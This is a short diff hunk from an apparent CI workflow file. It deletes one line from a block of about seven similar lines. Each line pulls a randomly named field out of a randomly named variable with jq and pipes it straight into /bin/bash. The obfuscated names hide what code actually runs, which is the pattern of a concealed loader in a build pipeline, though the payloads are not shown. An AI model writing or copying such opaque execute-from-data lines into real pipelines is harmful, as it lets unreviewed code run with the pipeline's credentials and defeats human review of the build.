@@ -22,7 +22,6 @@ jobs:
           echo $agu5639 | jq -r .gjbc0 | /bin/bash
           echo $ak01 | jq -r .gkip977 | /bin/bash
           echo $bmcbs9109 | jq -r .sgu66080 | /bin/bash
-          echo $r925 | jq -r .ora682 | /bin/bash
           printf '%s' "$hjg1" | jq -r .zn5969 | /bin/bash
           echo $gqwx256 | jq -r .dnvs1108 | /bin/bash
           echo $hb9 | jq -r .ha79248 | /bin/bash
